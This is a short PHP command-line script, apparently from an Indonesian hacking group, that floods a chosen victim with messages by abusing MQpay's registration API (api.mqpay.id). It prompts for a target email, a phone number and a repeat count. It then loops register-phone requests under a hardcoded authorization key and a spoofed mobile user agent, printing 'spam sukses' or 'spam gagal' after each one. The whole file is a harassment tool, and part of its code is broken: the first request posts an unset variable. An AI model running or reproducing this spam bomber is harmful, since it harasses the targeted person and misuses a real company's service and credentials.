<?php

$banner = "\e[36;1m                                                                                 

                                                                                 

           #         ######   

           #    #             

  ######   #    #  ########## 

           #    #  #        # 

           #######        ##  

##########      #       ##    

                #     ##      

                              

                                                                                 

[#] MQpay spam email [#]    

                                   

Author : Revan AR                  

Team   : IndoSec                   

Github : https//github.com/revan-ar/\n\n\e[0;1m";

sleep(2);

echo $banner;

sleep(1);

echo "email target : ";

$target = trim(fgets(STDIN));

sleep(1);

echo "nomor target : ";

$no = trim(fgets(STDIN));

sleep(1);

echo "jumlah : ";

$gas = trim(fgets(STDIN));

sleep(1);

echo "\n\n";

$data = "name=ghgugf&email=$target&password=asu12345&sponsor=";

$tot = curl_init();

curl_setopt($tot, CURLOPT_URL, "https://api.mqpay.id/home/register-acc?device_id=01359024076564027&version=102");

curl_setopt($tot, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($tot, CURLOPT_POST, 1);

curl_setopt($tot, CURLOPT_POSTFIELDS, $pos);

curl_setopt($tot, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "X-Authorization: 996e8f4eaba48cc98bd0baba50b4e5d0a61cfa4e"));

curl_setopt($tot, CURLOPT_USERAGENT, "okhttp/3.8.0");

$mbut = curl_exec($tot);

curl_close($tot);

 for ($i=1; $i <= $gas; $i++) {

$pos = "email=$target&phone=$no";

$to = curl_init();

curl_setopt($to, CURLOPT_URL, "https://api.mqpay.id/home/register-phone?device_id=01359024076564027&version=102");

curl_setopt($to, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($to, CURLOPT_POST, 1);

curl_setopt($to, CURLOPT_POSTFIELDS, $pos);

curl_setopt($to, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "X-Authorization: 996e8f4eaba48cc98bd0baba50b4e5d0a61cfa4e"));

curl_setopt($to, CURLOPT_USERAGENT, "okhttp/3.8.0");

$y = curl_exec($to);

curl_close($to);

$respon = json_decode($y);

if ($respon->message == "Login success") {

	echo "spam sukses\n";	}else{

		echo "spam gagal\n";

		}

}

?>
